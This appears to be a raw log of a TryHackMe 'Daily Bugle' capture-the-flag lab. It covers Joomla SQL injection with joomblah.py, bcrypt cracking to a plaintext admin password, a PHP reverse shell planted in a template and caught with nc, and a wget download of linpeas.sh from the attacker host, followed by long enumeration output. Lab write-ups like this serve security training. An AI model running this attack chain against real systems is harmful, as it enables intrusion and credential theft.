@@ -1,0 +1,1824 @@
+RECON
+root@kali:~/tryhackme/skynet# nmap -sC -sV -Pn 10.10.251.133
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   MariaDB (unauthorized)
+
+ENUM
+JOOMLA SERVER
+http://10.10.251.133/administrator/
+
+root@kali:~/tryhackme/dailybugle# joomscan -u http://10.10.251.133/administrator/
+
+
+    ____  _____  _____  __  __  ___   ___    __    _  _ 
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+			(1337.today)
+   
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.5
+    +---++---==[Update Date : [2018/03/13]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : KLOT
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://10.10.251.133/administrator/ ...
+
+
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://10.10.251.133/administrator/components
+http://10.10.251.133/administrator/modules
+http://10.10.251.133/administrator/templates
+http://10.10.251.133/administrator/includes
+http://10.10.251.133/administrator/language
+http://10.10.251.133/administrator/templates
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page not found
+
+[+] Checking robots.txt existing
+[++] robots.txt is not found
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+
+Your Report : reports/10.10.251.133/
+
+root@kali:~# git clone https://github.com/XiphosResearch/exploits.git
+fatal: destination path 'exploits' already exists and is not an empty directory.
+root@kali:~# ls -l exploits/Joom
+Joomblah/ Joomraa/  
+root@kali:~# ls -l exploits/Joomblah/
+total 12
+-rwxr-xr-x 1 root root 6024 Jun 15 18:09 joomblah.py
+-rw-r--r-- 1 root root 2467 Jun 15 18:09 README.md
+root@kali:~# cp exploits/Joomblah/joomblah.py /root/tryhackme/dailybugle/
+
+
+root@kali:~/tryhackme/dailybugle# python joomblah.py http://10.10.251.133
+                                                                                                                    
+    .---.    .-'''-.        .-'''-.                                                           
+    |   |   '   _    \     '   _    \                            .---.                        
+    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
+    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
+    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
+    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
+    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
+    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
+ __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
+|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
+|____.'                                                                `--'  `" '---'   '---' 
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+  -  Extracting sessions from fb9j5_session
+
+CRACK THE BCRYPT PASSWORD
+:~/src/john/run$ ./john --wordlist=/home/soladach/rockyou.txt --rules=wordlist --min-len=12 --max-len=12 /home/soladach/joomlahash.txt 
+Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
+Use the "--format=bcrypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+spiderman123     (?)
+1g 0:00:00:02 DONE (2020-10-25 22:23) 0.3717g/s 107.0p/s 107.0c/s 107.0C/s ilovepatrick..quetzalcoatl
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+LOGIN TO JOOMLA ADMIN PANEL
+http://10.10.251.133/administrator/index.php
+jonah
+spiderman123
+
+UPLOAD REVERSE SHELL
+http://jpsecuritytuts.blogspot.com/2014/05/how-to-shell-joomla-sites.html
+
+Add PHP extension to MEDIA uploads
+http://10.10.251.133/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA%3D%3D
+
+UPLOAD PENTEST MONKEY REVERSE SHELL TO INDEX.PHP IN DEFAULT TEMPLATE
+http://10.10.251.133/administrator/index.php?option=com_media
+
+START NC LISTENER
+
+CLICK ON TEMPLATE PREVIEW
+root@kali:~/tryhackme/dailybugle# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.251.133: inverse host lookup failed: Unknown host
+connect to [10.11.10.169] from (UNKNOWN) [10.10.251.133] 58034
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 09:54:33 up 37 min,  0 users,  load average: 0.03, 0.05, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ cat /home/jjameson/user.txt
+cat: /home/jjameson/user.txt: Permission denied
+
+
+UPLOAD LINPEAS AND RUN
+
+root@kali:~/tryhackme/dailybugle# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.251.133 - - [26/Oct/2020 09:57:03] "GET /linpeas.sh HTTP/1.1" 200 -
+
+
+sh-4.2$ cd /tmp
+cd /tmp
+sh-4.2$ wget http://10.11.10.169/linpeas.sh
+wget http://10.11.10.169/linpeas.sh
+--2020-10-26 09:57:04--  http://10.11.10.169/linpeas.sh
+Connecting to 10.11.10.169:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 225747 (220K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+     0K .......... .......... .......... .......... .......... 22%  939K 0s
+    50K .......... .......... .......... .......... .......... 45% 2.90M 0s
+   100K .......... .......... .......... .......... .......... 68% 3.05M 0s
+   150K .......... .......... .......... .......... .......... 90% 3.20M 0s
+   200K .......... ..........                                 100%  972K=0.1s
+
+2020-10-26 09:57:04 (1.76 MB/s) - 'linpeas.sh' saved [225747/225747]
+
+sh-4.2$ ls -l
+ls -l
+total 224
+-rw-rw-rw- 1 apache apache 225747 Jun 17 21:12 linpeas.sh
+sh-4.2$ chmod 744 linpeas.sh
+chmod 744 linpeas.sh
+
+
+
+CLICK ON TEMPLATE PREVIEW
+
+LINPEAS OUTPUT
+sh-4.2$ ./linpeas.sh
+./linpeas.sh
+which: no fping in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.6.1 by carlospolop
+
+ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 3.10.0-1062.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) ) #1 SMP Wed Aug 7 18:08:02 UTC 2019
+User & Groups: uid=48(apache) gid=48(apache) groups=48(apache)
+Hostname: dailybugle
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+[+] nmap is available for network discover & port scanning, you should use it yourself
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 3.10.0-1062.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) ) #1 SMP Wed Aug 7 18:08:02 UTC 2019
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.23
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Mon Oct 26 09:58:20 EDT 2020
+
+[+] System stats
+Filesystem               Size  Used Avail Use% Mounted on
+/dev/mapper/centos-root   13G  1.6G   12G  13% /
+devtmpfs                 482M     0  482M   0% /dev
+tmpfs                    495M     0  495M   0% /dev/shm
+tmpfs                    495M     0  495M   0% /sys/fs/cgroup
+tmpfs                    495M  6.6M  489M   2% /run
+/dev/xvda1              1014M  174M  841M  18% /boot
+              total        used        free      shared  buff/cache   available
+Mem:        1013048      326260      507740        6816      179048      533852
+Swap:       1609724           0     1609724
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTSIZE=0
+HISTFILESIZE=0
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C
+NOTIFY_SOCKET=/run/systemd/notify
+SHLVL=3
+HISTFILE=/dev/null
+_=/usr/bin/env
+
+[+] Looking for Signature verification failed in dmseg
+ Not Found
+
+[+] AppArmor enabled? .............. AppArmor Not Found
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... SELinux status:                 disabled
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+
+
+=========================================( Devices )==========================================
+[+] Any sd* disk in /dev? (limit 20)
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+
+/dev/mapper/centos-root	/	xfs	defaults	0 0
+UUID=9e2c8318-174c-4a83-a33c-c7fd97b900fc	/boot	xfs	defaults	0 0
+/dev/mapper/centos-swap	swap	swap	defaults	0 0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/usr/bin/nmap
+/usr/bin/nc
+/usr/bin/ncat
+/usr/bin/wget
+/usr/bin/curl
+/usr/bin/ping
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python2.7
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+apache    1446  0.0  2.7 536516 27532 ?        S    09:17   0:02 /usr/sbin/httpd -DFOREGROUND
+apache    1448  0.0  2.4 534172 25128 ?        S    09:17   0:02 /usr/sbin/httpd -DFOREGROUND
+apache    1496  0.1  2.2 604784 22440 ?        S    09:25   0:02 /usr/sbin/httpd -DFOREGROUND
+apache    1553  0.1  1.3 523016 13844 ?        S    09:38   0:01 /usr/sbin/httpd -DFOREGROUND
+apache    1585  0.0  2.1 531084 21904 ?        S    09:42   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1587  0.0  2.2 604908 22596 ?        S    09:42   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1643  0.0  2.4 534008 24428 ?        S    09:47   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1653  0.0  2.2 532312 22560 ?        S    09:48   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1654  0.0  1.3 522648 13304 ?        S    09:48   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1655  0.0  2.0 529616 20360 ?        S    09:48   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1687  0.0  0.1  11688  1344 ?        S    09:54   0:00 sh -c uname -a; w; id; /bin/sh -i
+apache    1691  0.0  0.1  11828  1724 ?        S    09:54   0:00 /bin/sh -i
+apache    1695  0.3  0.2  12316  2252 ?        S    09:58   0:00 /bin/sh ./linpeas.sh
+apache    2181  0.0  0.1  51752  1732 ?        R    09:58   0:00 ps aux
+apache    2183  0.0  0.0  12884   756 ?        S    09:58   0:00 sort
+chrony     652  0.0  0.1 117804  1716 ?        S    09:16   0:00 /usr/sbin/chronyd
+dbus       650  0.0  0.2  58236  2456 ?        Ss   09:16   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+mysql     1091  0.0  0.1 113316  1592 ?        Ss   09:17   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
+mysql     1253  0.0 10.0 1036868 101512 ?      Sl   09:17   0:02 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
+polkitd    649  0.0  1.1 612244 12100 ?        Ssl  09:16   0:00 /usr/lib/polkit-1/polkitd --no-debug
+postfix   1079  0.0  0.4  89804  4056 ?        S    09:17   0:00 pickup -l -t unix -u
+postfix   1080  0.0  0.4  89996  4264 ?        S    09:17   0:00 qmgr -l -t unix -u
+root         1  0.0  0.3 125364  3808 ?        Ss   09:16   0:00 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
+root       478  0.0  0.2  37220  2256 ?        Ss   09:16   0:00 /usr/lib/systemd/systemd-journald
+root       498  0.0  0.1 190372  1352 ?        Ss   09:16   0:00 /usr/sbin/lvmetad -f
+root       505  0.0  0.2  45520  2620 ?        Ss   09:16   0:00 /usr/lib/systemd/systemd-udevd
+root       623  0.0  0.0  55528   888 ?        S<sl 09:16   0:00 /sbin/auditd
+root       658  0.0  0.8 474036  8240 ?        Ssl  09:16   0:00 /usr/sbin/NetworkManager --no-daemon
+root       659  0.0  0.1  24256  1592 ?        Ss   09:16   0:00 /usr/lib/systemd/systemd-logind
+root       664  0.0  0.1 126292  1564 ?        Ss   09:16   0:00 /usr/sbin/crond -n
+root       899  0.0  0.2 102896  2764 ?        Ss   09:17   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid -H dailybugle eth0
+root       957  0.0  1.9 574200 19460 ?        Ssl  09:17   0:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       958  0.0  0.4 112920  4312 ?        Ss   09:17   0:00 /usr/sbin/sshd -D
+root       961  0.0  1.4 418092 15128 ?        Ss   09:17   0:00 /usr/sbin/httpd -DFOREGROUND
+root       962  0.0  0.4 220900  4080 ?        Ssl  09:17   0:00 /usr/sbin/rsyslogd -n
+root       977  0.0  0.0 110108   856 tty1     Ss+  09:17   0:00 /sbin/agetty --noclear tty1 linux
+root       978  0.0  0.0 110108   856 ttyS0    Ss+  09:17   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
+root      1075  0.0  0.2  89700  2184 ?        Ss   09:17   0:00 /usr/libexec/postfix/master -w
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+lrwxrwxrwx. 1 root root        4 Dec 14  2019 /bin/sh -> bash
+-rwxr-xr-x. 1 root root    49640 Aug  8  2019 /sbin/agetty
+-rwxr-xr-x. 1 root root   128664 Aug  8  2019 /sbin/auditd
+-rwxr-xr-x. 1 root root   424352 Aug  8  2019 /sbin/dhclient
+-rwxr-xr-x. 1 root root   223320 Mar 14  2019 /usr/bin/dbus-daemon
+lrwxrwxrwx. 1 root root        9 Dec 14  2019 /usr/bin/python2 -> python2.7
+-rwxr-xr-x. 1 root root   120432 Aug  8  2019 /usr/lib/polkit-1/polkitd
+-rwxr-xr-x. 1 root root  1624552 Aug  8  2019 /usr/lib/systemd/systemd
+-rwxr-xr-x. 1 root root   346240 Aug  8  2019 /usr/lib/systemd/systemd-journald
+-rwxr-xr-x. 1 root root   635800 Aug  8  2019 /usr/lib/systemd/systemd-logind
+-rwxr-xr-x. 1 root root   416240 Aug  8  2019 /usr/lib/systemd/systemd-udevd
+-rwxr-xr-x. 1 root root 14295232 Aug  8  2019 /usr/libexec/mysqld
+-rwxr-xr-x. 1 root root   172568 Oct 30  2018 /usr/libexec/postfix/master
+-rwxr-xr-x. 1 root root  2957928 Aug  8  2019 /usr/sbin/NetworkManager
+-rwxr-xr-x. 1 root root   269392 Aug  8  2019 /usr/sbin/chronyd
+-rwxr-xr-x. 1 root root    70216 Aug  8  2019 /usr/sbin/crond
+-rwxr-xr-x. 1 root root   523680 Aug  8  2019 /usr/sbin/httpd
+-r-xr-xr-x. 1 root root    73376 Aug  8  2019 /usr/sbin/lvmetad
+-rwxr-xr-x. 1 root root   663912 Aug  8  2019 /usr/sbin/rsyslogd
+-rwxr-xr-x. 1 root root   852856 Aug  8  2019 /usr/sbin/sshd
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
+-rw-------. 1 root root   0 Aug  8  2019 /etc/cron.deny
+-rw-r--r--. 1 root root 451 Jun  9  2014 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x.  2 root root   21 Dec 14  2019 .
+drwxr-xr-x. 79 root root 8192 Jan 14  2020 ..
+-rw-r--r--.  1 root root  128 Aug  8  2019 0hourly
+
+/etc/cron.daily:
+total 20
+drwxr-xr-x.  2 root root   42 Dec 14  2019 .
+drwxr-xr-x. 79 root root 8192 Jan 14  2020 ..
+-rwx------.  1 root root  219 Oct 30  2018 logrotate
+-rwxr-xr-x.  1 root root  618 Oct 30  2018 man-db.cron
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.  2 root root   22 Jun  9  2014 .
+drwxr-xr-x. 79 root root 8192 Jan 14  2020 ..
+-rwxr-xr-x.  1 root root  392 Aug  8  2019 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 79 root root 8192 Jan 14  2020 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 79 root root 8192 Jan 14  2020 ..
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+
+
+
+[+] Services
+[i] Search for outdated versions
+netconsole module not loaded
+Configured devices:
+lo eth0
+Currently active devices:
+lo eth0
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/var/www/html/libraries/joomla/http/transport/cacert.pem
+You can't write on systemd PATH so I'm not going to list relative paths executed by services
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
+Tue 2020-10-27 09:31:42 EDT  23h left Mon 2020-10-26 09:31:42 EDT  26min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a      n/a                          n/a       systemd-readahead-done.timer systemd-readahead-done.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+dailybugle
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+; generated by /usr/sbin/dhclient-script
+search eu-west-1.compute.internal
+nameserver 10.0.0.2
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Networks and neighbours
+default 0.0.0.0
+loopback 127.0.0.0
+link-local 169.254.0.0
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 02:c7:b1:41:93:47 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.251.133/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2659sec preferred_lft 2659sec
+    inet6 fe80::c7:b1ff:fe41:9347/64 scope link 
+       valid_lft forever preferred_lft forever
+10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Testing 'sudo -l' without password & /etc/sudoers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+
+[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(bin) gid=1(bin) groups=1(bin)
+uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=12(games) gid=100(users) groups=100(users)
+uid=14(ftp) gid=50(ftp) groups=50(ftp)
+uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)
+uid=2(daemon) gid=2(daemon) groups=2(daemon)
+uid=27(mysql) gid=27(mysql) groups=27(mysql)
+uid=3(adm) gid=4(adm) groups=4(adm)
+uid=4(lp) gid=7(lp) groups=7(lp)
+uid=48(apache) gid=48(apache) groups=48(apache)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=74(sshd) gid=74(sshd) groups=74(sshd)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
+uid=99(nobody) gid=99(nobody) groups=99(nobody)
+uid=998(chrony) gid=996(chrony) groups=996(chrony)
+uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)
+
+[+] Login now
+ 09:58:32 up 41 min,  0 users,  load average: 0.21, 0.07, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+jjameson pts/0        netwars          Mon Dec 16 04:40 - 04:44  (00:03)    
+reboot   system boot  3.10.0-1062.el7. Mon Dec 16 04:38 - 09:58 (315+04:20) 
+jjameson pts/0        netwars          Sun Dec 15 18:54 - crash  (09:43)    
+reboot   system boot  3.10.0-1062.el7. Sun Dec 15 18:53 - 09:58 (315+14:05) 
+jjameson pts/0        netwars          Sat Dec 14 15:41 - crash (1+03:11)   
+reboot   system boot  3.10.0-1062.el7. Sat Dec 14 15:40 - 09:58 (316+17:17) 
+jjameson pts/0        netwars          Sat Dec 14 15:02 - 15:41  (00:38)    
+reboot   system boot  3.10.0-1062.el7. Sat Dec 14 14:09 - 09:58 (316+18:48) 
+
+wtmp begins Sat Dec 14 14:09:36 2019
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             pts/0    netwars          Mon Dec 16 05:11:46 -0500 2019
+jjameson         pts/0    netwars          Mon Dec 16 05:14:55 -0500 2019
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql  Ver 15.1 Distrib 5.5.64-MariaDB, for Linux (x86_64) using readline 5.1
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
